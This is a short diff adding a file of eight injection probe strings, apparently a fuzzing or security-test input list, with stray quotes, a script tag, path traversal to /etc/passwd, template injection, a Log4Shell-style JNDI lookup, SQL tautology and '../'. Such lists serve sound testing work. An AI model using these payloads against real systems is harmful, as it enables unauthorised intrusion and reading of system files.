@@ -1,0 +1,8 @@
+'
+"
+<script>
+../../etc/passwd
+{{7*7}}
+${jndi:ldap://x}
+1 OR 1=1
+../
